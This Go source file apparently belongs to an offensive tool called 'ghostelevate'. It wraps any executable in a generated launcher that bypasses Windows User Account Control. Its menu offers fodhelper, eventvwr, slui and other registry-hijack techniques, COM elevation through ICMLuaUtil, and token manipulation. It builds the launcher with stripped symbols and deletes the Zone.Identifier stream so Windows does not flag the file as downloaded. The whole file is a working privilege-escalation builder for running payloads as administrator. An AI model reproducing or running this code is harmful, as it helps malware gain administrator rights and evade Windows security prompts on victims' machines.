package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)
var wrapperSource string
var banner = "     _\n  |\\'/-..--.\n / _ _   ,  ;\n" + "`~=`" + "Y'~_<._./\n <" + "`-....__.'  fsc\n"
var procDeleteFileW = syscall.NewLazyDLL("kernel32.dll").NewProc("DeleteFileW")

func main() {
	fmt.Print(banner)

	args := os.Args[1:]
	if len(args) == 0 {
		printUsage()
		os.Exit(1)
	}

	for _, a := range args {
		if a == "--list" {
			printTechniques()
			os.Exit(0)
		}
	}

	technique := ""
	payloadPath := ""
	for i := 0; i < len(args); i++ {
		if args[i] == "--technique" && i+1 < len(args) {
			technique = strings.ToLower(args[i+1])
			i++
			continue
		}
		if args[i] == "--list" || args[i] == "--check" {
			continue
		}
		if payloadPath == "" {
			payloadPath = args[i]
		}
	}

	if payloadPath == "" {
		fmt.Println("no target .exe specified")
		os.Exit(1)
	}

	absPath, err := filepath.Abs(payloadPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "invalid path: %v\n", err)
		os.Exit(1)
	}

	if _, err := os.Stat(absPath); os.IsNotExist(err) {
		fmt.Fprintf(os.Stderr, "file not found: %s\n", absPath)
		os.Exit(1)
	}

	base := filepath.Base(absPath)
	name := strings.TrimSuffix(base, filepath.Ext(base))
	outputName := name + "-UAC.exe"
	outputPath := filepath.Join(filepath.Dir(absPath), outputName)

	fmt.Printf("target:    %s\n", absPath)
	if technique != "" {
		fmt.Printf("technique: %s\n", technique)
	}
	fmt.Printf("output:    %s\n", outputPath)

	if _, err := exec.LookPath("go"); err != nil {
		fmt.Fprintln(os.Stderr, "go compiler not found in PATH")
		os.Exit(1)
	}

	tmpDir, err := os.MkdirTemp("", "ghostelevate-build-*")
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to create temp dir: %v\n", err)
		os.Exit(1)
	}
	defer os.RemoveAll(tmpDir)

	escapedPath := strings.ReplaceAll(absPath, `\`, `\\`)
	wrapperCode := strings.ReplaceAll(wrapperSource, "{{PAYLOAD_PATH}}", escapedPath)

	if technique != "" {
		valid := map[string]bool{
			"fodhelper": true, "computerdefaults": true, "silentcleanup": true,
			"eventvwr": true, "slui": true, "icmluautil": true, "token": true,
		}
		if !valid[technique] {
			fmt.Fprintf(os.Stderr, "unknown technique: %s\n", technique)
			fmt.Println("use --list to see available techniques")
			os.Exit(1)
		}
		wrapperCode = replaceMain(wrapperCode, technique)
	}

	if err := os.WriteFile(filepath.Join(tmpDir, "main.go"), []byte(wrapperCode), 0644); err != nil {
		fmt.Fprintf(os.Stderr, "failed to write wrapper source: %v\n", err)
		os.Exit(1)
	}

	goMod := `module ghostelevate-wrapper

go 1.21

require golang.org/x/sys v0.47.0
`
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		fmt.Fprintf(os.Stderr, "failed to write go.mod: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("resolving dependencies...")
	tidyCmd := exec.Command("go", "mod", "tidy")
	tidyCmd.Dir = tmpDir
	tidyCmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	tidyCmd.Stdout = os.Stdout
	tidyCmd.Stderr = os.Stderr
	if err := tidyCmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "go mod tidy failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("compiling...")
	buildCmd := exec.Command("go", "build", "-ldflags=-s -w", "-o", outputPath, ".")
	buildCmd.Dir = tmpDir
	buildCmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	buildCmd.Stdout = os.Stdout
	buildCmd.Stderr = os.Stderr

	if err := buildCmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "build failed: %v\n", err)
		os.Exit(1)
	}

	unblockFile(outputPath)

	info, err := os.Stat(outputPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "output not found after build\n")
		os.Exit(1)
	}

	fmt.Printf("generated: %s (%.1f KB)\n", outputPath, float64(info.Size())/1024)
}

func printUsage() {
	fmt.Print(`
usage: ghostelevate <target.exe> [options]

options:
  --technique <name>   build with a specific technique
  --list               list available techniques

examples:
  ghostelevate payload.exe
  ghostelevate payload.exe --technique icmluautil
  ghostelevate --list
`)
}

func printTechniques() {
	fmt.Println(`
available techniques:

  registry hijack (needs Default UAC):
    fodhelper            win10 1709+
    computerdefaults     win10+
    silentcleanup        win8.1+
    eventvwr             win7-8.1
    slui                 win8.1+

  advanced (zero footprint):
    icmluautil           COM elevation, no registry writes
    token                token manipulation, works with Always Notify

  auto mode (default): tries all in order
`)
}

func replaceMain(code, technique string) string {
	techniqueMap := map[string]string{
		"fodhelper":        "tryFODHelper()",
		"computerdefaults": "tryComputerDefaults()",
		"silentcleanup":    "trySilentCleanup()",
		"slui":             "trySLUI()",
		"icmluautil":       "tryICMLuaUtil()",
		"token":            "tryTokenManipulation()",
		"eventvwr":         `func() { deleteKeyTree("Software\\Classes\\mscfile"); hijackAndLaunch("Software\\Classes\\mscfile\\Shell\\Open\\Command", "eventvwr.exe", func(){ deleteKeyTree("Software\\Classes\\mscfile") }) }()`,
	}

	call := techniqueMap[technique]

	idx := strings.Index(code, "func main() {")
	if idx == -1 {
		return code
	}

	end := idx
	depth := 0
	for i := idx; i < len(code); i++ {
		if code[i] == '{' {
			depth++
		} else if code[i] == '}' {
			depth--
			if depth == 0 {
				end = i + 1
				break
			}
		}
	}

	newMain := "func main() {\n\tif _, err := os.Stat(payloadPath); os.IsNotExist(err) {\n\t\treturn\n\t}\n\tunblockFile(payloadPath)\n\t" + call + "\n}\n"
	return code[:idx] + newMain + code[end:]
}

func unblockFile(path string) {
	adsPath, _ := syscall.UTF16PtrFromString(path + ":Zone.Identifier")
	procDeleteFileW.Call(uintptr(unsafe.Pointer(adsPath)))
}
